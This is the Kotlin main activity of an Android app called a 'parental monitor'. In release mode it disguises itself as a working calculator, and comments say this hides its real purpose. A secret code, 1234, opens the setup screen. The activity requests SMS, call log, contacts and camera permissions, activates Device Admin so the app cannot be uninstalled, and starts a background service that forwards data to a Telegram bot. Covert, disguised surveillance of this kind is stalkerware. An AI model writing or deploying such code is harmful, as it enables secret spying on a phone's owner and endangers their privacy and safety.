package com.redeye.parentalmonitor.ui

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputEditText
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.receiver.AdminReceiver
import com.redeye.parentalmonitor.receiver.NetworkChangeReceiver
import com.redeye.parentalmonitor.service.MonitoringService
import android.widget.TextView
import android.content.Context
import java.text.SimpleDateFormat
import java.util.*
import com.redeye.parentalmonitor.BuildConfig
import android.view.View
import android.widget.LinearLayout

class MainActivity : AppCompatActivity() {

    private lateinit var preferencesManager: PreferencesManager
    private lateinit var messageQueue: MessageQueue
    
    private lateinit var botTokenInput: TextInputEditText
    private lateinit var chatIdInput: TextInputEditText
    private lateinit var syncIntervalInput: TextInputEditText
    private lateinit var saveSettingsButton: MaterialButton
    private lateinit var requestPermissionsButton: MaterialButton
    private lateinit var toggleMonitoringButton: MaterialButton
    private lateinit var statusText: TextView
    private lateinit var lastSyncText: TextView

    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.CAMERA
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA
        )
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            android.util.Log.i("MainActivity", "✅ All permissions granted!")
            Toast.makeText(this, "Barcha ruxsatlar berildi", Toast.LENGTH_SHORT).show()
            
            // RELEASE mode: Auto-start service after permissions granted
            if (!BuildConfig.DEBUG && preferencesManager.isConfigured()) {
                android.util.Log.i("MainActivity", "🚀 Starting monitoring service after permissions...")
                if (!preferencesManager.isMonitoringEnabled) {
                    try {
                        startMonitoringService()
                        preferencesManager.isMonitoringEnabled = true
                        android.util.Log.i("MainActivity", "✓ Service started successfully!")
                        Toast.makeText(this, "✓ Monitoring boshlandi", Toast.LENGTH_SHORT).show()
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "✗ Failed to start service: ${e.message}")
                    }
                }
            }
            
            updateUI()
        } else {
            android.util.Log.w("MainActivity", "⚠️ Some permissions denied")
            Toast.makeText(this, "Ba'zi ruxsatlar berilmadi", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        android.util.Log.i("MainActivity", "═══ MainActivity onCreate ═══")
        android.util.Log.i("MainActivity", "BuildConfig.DEBUG = ${BuildConfig.DEBUG}")
        
        preferencesManager = PreferencesManager(this)
        messageQueue = MessageQueue(this)
        
        // Apply pre-configured settings
        try {
            android.util.Log.d("MainActivity", "Attempting to load AutoConfig...")
            val autoConfigClass = Class.forName("com.redeye.parentalmonitor.utils.AutoConfig")
            val applyMethod = autoConfigClass.getDeclaredMethod("applyIfNeeded", Context::class.java)
            applyMethod.invoke(autoConfigClass.getField("INSTANCE").get(null), this)
            android.util.Log.i("MainActivity", "✓ AutoConfig applied successfully")
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "✗ AutoConfig not available: ${e.message}")
        }
        
        // RELEASE mode: Show CALCULATOR (hide real purpose)
        if (!BuildConfig.DEBUG) {
            android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
            setContentView(R.layout.activity_calculator)
            initCalculator()
            startMonitoringInBackground()
            return
        }
        
        // DEBUG mode: Load settings UI
        android.util.Log.i("MainActivity", "Running in DEBUG mode")
        setContentView(R.layout.activity_main)
        
        initViews()
        setupListeners()
        loadSettings()
        updateUI()
    }
    
     private fun handleReleaseModeWithoutUI() {
         android.util.Log.i("MainActivity", "═══ RELEASE mode - Auto-starting (NO UI) ═══")
         
         // Check permissions
         val hasPerms = hasAllPermissions()
         android.util.Log.d("MainActivity", "Has all permissions: $hasPerms")
         
         // Auto-request permissions if needed
         if (!hasPerms) {
             android.util.Log.w("MainActivity", "Permissions missing, requesting...")
             Toast.makeText(this, "Iltimos, barcha ruxsatlarni bering va qayta oching", Toast.LENGTH_LONG).show()
             requestPermissions()
             return
         }
         
         // Check if configured
         val isConfigured = preferencesManager.isConfigured()
         android.util.Log.d("MainActivity", "Is configured: $isConfigured")
         
         if (!isConfigured) {
             android.util.Log.e("MainActivity", "✗ NOT CONFIGURED!")
             android.util.Log.e("MainActivity", "Bot Token: '${preferencesManager.botToken}'")
             android.util.Log.e("MainActivity", "Chat ID: '${preferencesManager.chatId}'")
             Toast.makeText(this, "Xatolik: Sozlamalar yo'q! APK'ni builder.sh bilan qayta build qiling.", Toast.LENGTH_LONG).show()
             finish()
             return
         }
         
         // Auto-start monitoring
         val isMonitoring = preferencesManager.isMonitoringEnabled
         android.util.Log.d("MainActivity", "Is monitoring enabled: $isMonitoring")
         
         if (!isMonitoring) {
             android.util.Log.i("MainActivity", "Starting MonitoringService...")
             try {
                 startMonitoringService()
                 preferencesManager.isMonitoringEnabled = true
                 android.util.Log.i("MainActivity", "✓ MonitoringService started successfully!")
                 Toast.makeText(this, "✓ Xizmat ishga tushdi", Toast.LENGTH_SHORT).show()
             } catch (e: Exception) {
                 android.util.Log.e("MainActivity", "✗ Failed to start service: ${e.message}", e)
                 Toast.makeText(this, "Xatolik: Xizmatni ishga tushirishda muammo", Toast.LENGTH_LONG).show()
                 finish()
                 return
             }
         } else {
             android.util.Log.i("MainActivity", "Service already running")
             Toast.makeText(this, "Xizmat allaqachon ishlamoqda", Toast.LENGTH_SHORT).show()
         }
         
         // Close activity immediately
         android.util.Log.d("MainActivity", "Closing activity in 1 second...")
         android.os.Handler(mainLooper).postDelayed({
             android.util.Log.i("MainActivity", "Finishing activity...")
             finish()
         }, 1000)
     }

    override fun onResume() {
        super.onResume()
        // Only update UI in DEBUG mode
        if (BuildConfig.DEBUG) {
            updateUI()
        }
    }
    
    // ═══════════════════════════════════════════════════════════
    // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
    // ═══════════════════════════════════════════════════════════
    
    private var calculatorDisplay: android.widget.TextView? = null
    private var currentNumber = ""
    private var operator = ""
    private var previousNumber = ""
    
    private fun initCalculator() {
        android.util.Log.i("MainActivity", "Initializing Calculator UI")
        calculatorDisplay = findViewById(R.id.calculatorDisplay)
        
        // Number buttons
        findViewById<android.widget.Button>(R.id.btn0).setOnClickListener { appendNumber("0") }
        findViewById<android.widget.Button>(R.id.btn1).setOnClickListener { appendNumber("1") }
        findViewById<android.widget.Button>(R.id.btn2).setOnClickListener { appendNumber("2") }
        findViewById<android.widget.Button>(R.id.btn3).setOnClickListener { appendNumber("3") }
        findViewById<android.widget.Button>(R.id.btn4).setOnClickListener { appendNumber("4") }
        findViewById<android.widget.Button>(R.id.btn5).setOnClickListener { appendNumber("5") }
        findViewById<android.widget.Button>(R.id.btn6).setOnClickListener { appendNumber("6") }
        findViewById<android.widget.Button>(R.id.btn7).setOnClickListener { appendNumber("7") }
        findViewById<android.widget.Button>(R.id.btn8).setOnClickListener { appendNumber("8") }
        findViewById<android.widget.Button>(R.id.btn9).setOnClickListener { appendNumber("9") }
        findViewById<android.widget.Button>(R.id.btnDot).setOnClickListener { appendNumber(".") }
        
        // Operator buttons
        findViewById<android.widget.Button>(R.id.btnPlus).setOnClickListener { setOperator("+") }
        findViewById<android.widget.Button>(R.id.btnMinus).setOnClickListener { setOperator("-") }
        findViewById<android.widget.Button>(R.id.btnMultiply).setOnClickListener { setOperator("×") }
        findViewById<android.widget.Button>(R.id.btnDivide).setOnClickListener { setOperator("÷") }
        
        // Function buttons
        findViewById<android.widget.Button>(R.id.btnEquals).setOnClickListener { calculate() }
        findViewById<android.widget.Button>(R.id.btnClear).setOnClickListener { clear() }
        
        android.util.Log.i("MainActivity", "✓ Calculator initialized")
    }
    
    private fun appendNumber(number: String) {
        if (currentNumber == "0" && number != ".") {
            currentNumber = number
        } else {
            if (number == "." && currentNumber.contains(".")) return
            currentNumber += number
        }
        
        // SECRET CODE: "1234" triggers admin activation
        if (currentNumber == "1234") {
            android.util.Log.i("MainActivity", "Secret code detected!")
        }
        
        updateCalculatorDisplay()
    }
    
    private fun setOperator(op: String) {
        if (currentNumber.isEmpty()) return
        if (previousNumber.isNotEmpty()) {
            calculate()
        }
        operator = op
        previousNumber = currentNumber
        currentNumber = ""
    }
    
    private fun calculate() {
        // SECRET CODE: ketik 1234 lalu = untuk buka halaman Setup Bot
        if (currentNumber == "1234" || previousNumber == "1234") {
            android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
            currentNumber = ""
            previousNumber = ""
            operator = ""
            updateCalculatorDisplay()
            openSetupPage()
            return
        }
        
        if (previousNumber.isEmpty() || currentNumber.isEmpty()) return
        
        val num1 = previousNumber.toDoubleOrNull() ?: return
        val num2 = currentNumber.toDoubleOrNull() ?: return
        
        val result = when (operator) {
            "+" -> num1 + num2
            "-" -> num1 - num2
            "×" -> num1 * num2
            "÷" -> if (num2 != 0.0) num1 / num2 else Double.NaN
            else -> num2
        }
        
        currentNumber = if (result.isNaN()) {
            "Error"
        } else if (result % 1.0 == 0.0) {
            result.toInt().toString()
        } else {
            result.toString()
        }
        
        previousNumber = ""
        operator = ""
        updateCalculatorDisplay()
    }
    
    private fun clear() {
        currentNumber = ""
        previousNumber = ""
        operator = ""
        updateCalculatorDisplay()
    }
    
    private fun updateCalculatorDisplay() {
        calculatorDisplay?.text = if (currentNumber.isEmpty()) "0" else currentNumber
    }
    
    private fun openSetupPage() {
        try {
            startActivity(Intent(this, SetupActivity::class.java))
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to open setup", e)
            Toast.makeText(this, "Gagal buka setup: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startMonitoringInBackground() {
        android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
        
        // Check if already configured and has permissions
        if (!preferencesManager.isConfigured()) {
            android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
            return
        }
        
        // Auto-activate Device Admin (silently)
        if (!isDeviceAdminActive()) {
            android.util.Log.w("MainActivity", "Device Admin not active - activating silently...")
            activateDeviceAdmin()
        }
        
        // Silently request permissions if needed
        if (!hasAllPermissions()) {
            android.util.Log.w("MainActivity", "Requesting permissions silently...")
            requestPermissions()
            return
        }
        
        // Start monitoring service silently
        if (!preferencesManager.isMonitoringEnabled) {
            try {
                startMonitoringService()
                preferencesManager.isMonitoringEnabled = true
                android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
            }
        } else {
            android.util.Log.i("MainActivity", "Monitoring already running")
        }
    }
    
    // ═══════════════════════════════════════════════════════════
    // DEVICE ADMIN FUNCTIONS (UNINSTALL PROTECTION)
    // ═══════════════════════════════════════════════════════════
    
    private fun isDeviceAdminActive(): Boolean {
        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, AdminReceiver::class.java)
        return devicePolicyManager.isAdminActive(adminComponent)
    }
    
    private fun activateDeviceAdmin() {
        android.util.Log.i("MainActivity", "Activating Device Admin...")
        
        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, AdminReceiver::class.java)
        
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Ilovani o'chirishdan himoya qilish uchun administrator ruxsati kerak"
                )
            }
            try {
                startActivity(intent)
                Toast.makeText(this, "🔐 Himoya yoqilmoqda...", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Failed to activate Device Admin", e)
                Toast.makeText(this, "Xatolik: Device Admin aktivlashtirib bo'lmadi", Toast.LENGTH_SHORT).show()
            }
        } else {
            Toast.makeText(this, "✅ Himoya allaqachon yoqilgan", Toast.LENGTH_SHORT).show()
            android.util.Log.i("MainActivity", "Device Admin already active")
        }
    }

    private fun initViews() {
        try {
            botTokenInput = findViewById(R.id.botTokenInput)
            chatIdInput = findViewById(R.id.chatIdInput)
            syncIntervalInput = findViewById(R.id.syncIntervalInput)
            saveSettingsButton = findViewById(R.id.saveSettingsButton)
            requestPermissionsButton = findViewById(R.id.requestPermissionsButton)
            toggleMonitoringButton = findViewById(R.id.toggleMonitoringButton)
            statusText = findViewById(R.id.statusText)
            lastSyncText = findViewById(R.id.lastSyncText)
            android.util.Log.d("MainActivity", "✓ All views initialized")
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "✗ Error initializing views", e)
        }
    }

    private fun setupListeners() {
        saveSettingsButton.setOnClickListener {
            saveSettings()
        }

        requestPermissionsButton.setOnClickListener {
            requestPermissions()
        }

        toggleMonitoringButton.setOnClickListener {
            toggleMonitoring()
        }
    }

    private fun loadSettings() {
        botTokenInput.setText(preferencesManager.botToken)
        chatIdInput.setText(preferencesManager.chatId)
        syncIntervalInput.setText(preferencesManager.syncInterval.toString())
    }

    private fun saveSettings() {
        val botToken = botTokenInput.text.toString().trim()
        val chatId = chatIdInput.text.toString().trim()
        val syncInterval = syncIntervalInput.text.toString().toIntOrNull() ?: 60

        if (botToken.isEmpty() || chatId.isEmpty()) {
            Toast.makeText(this, "Iltimos, barcha maydonlarni to'ldiring", Toast.LENGTH_SHORT).show()
            return
        }

        preferencesManager.botToken = botToken
        preferencesManager.chatId = chatId
        preferencesManager.syncInterval = syncInterval

        Toast.makeText(this, getString(R.string.settings_saved), Toast.LENGTH_SHORT).show()
        updateUI()
    }

    private fun requestPermissions() {
        permissionLauncher.launch(requiredPermissions)
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun toggleMonitoring() {
        if (!preferencesManager.isConfigured()) {
            Toast.makeText(this, "Avval Telegram sozlamalarini saqlang", Toast.LENGTH_SHORT).show()
            return
        }

        if (!hasAllPermissions()) {
            Toast.makeText(this, "Avval barcha ruxsatlarni bering", Toast.LENGTH_SHORT).show()
            requestPermissions()
            return
        }

        val isEnabled = preferencesManager.isMonitoringEnabled

        if (isEnabled) {
            // Stop monitoring
            stopMonitoringService()
            preferencesManager.isMonitoringEnabled = false
            Toast.makeText(this, "Nazorat to'xtatildi", Toast.LENGTH_SHORT).show()
        } else {
            // Start monitoring
            startMonitoringService()
            preferencesManager.isMonitoringEnabled = true
            Toast.makeText(this, "Nazorat boshlandi", Toast.LENGTH_SHORT).show()
        }

        updateUI()
    }

    private fun startMonitoringService() {
        android.util.Log.d("MainActivity", "Creating service intent...")
        val intent = Intent(this, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_START_MONITORING
        }
        
        android.util.Log.d("MainActivity", "Starting service...")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
                android.util.Log.i("MainActivity", "Started as foreground service")
            } else {
                startService(intent)
                android.util.Log.i("MainActivity", "Started as regular service")
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to start service", e)
            throw e
        }
    }

    private fun stopMonitoringService() {
        val intent = Intent(this, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_STOP_MONITORING
        }
        startService(intent)
    }

    private fun updateUI() {
        // Skip UI updates in RELEASE mode
        if (!BuildConfig.DEBUG) {
            return
        }
        
        val isMonitoring = preferencesManager.isMonitoringEnabled
        val hasPermissions = hasAllPermissions()
        val isConfigured = preferencesManager.isConfigured()

        // Update status
        if (isMonitoring) {
            statusText.text = getString(R.string.monitoring_active)
            statusText.setTextColor(getColor(R.color.green_success))
        } else {
            statusText.text = getString(R.string.monitoring_inactive)
            statusText.setTextColor(getColor(R.color.red_error))
        }

        // Update last sync time
        val lastSync = preferencesManager.lastSyncTime
        val queueSize = messageQueue.getQueueSize()
        
        if (lastSync > 0) {
            val sdf = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault())
            var text = "${getString(R.string.last_sync)} ${sdf.format(Date(lastSync))}"
            if (queueSize > 0) {
                text += "\nNavbatda: $queueSize ta xabar"
            }
            lastSyncText.text = text
        } else {
            var text = "${getString(R.string.last_sync)} ${getString(R.string.never)}"
            if (queueSize > 0) {
                text += "\nNavbatda: $queueSize ta xabar"
            }
            lastSyncText.text = text
        }
        
        // Try to send queued messages if any
        if (queueSize > 0) {
            NetworkChangeReceiver.scheduleMessageSend(this)
        }

        // Update toggle button
        if (isMonitoring) {
            toggleMonitoringButton.text = getString(R.string.disable_monitoring)
            toggleMonitoringButton.setIconResource(android.R.drawable.ic_media_pause)
        } else {
            toggleMonitoringButton.text = getString(R.string.enable_monitoring)
            toggleMonitoringButton.setIconResource(android.R.drawable.ic_media_play)
        }

        // Enable/disable buttons based on state
        toggleMonitoringButton.isEnabled = isConfigured && hasPermissions
        requestPermissionsButton.isEnabled = !hasPermissions
    }
}

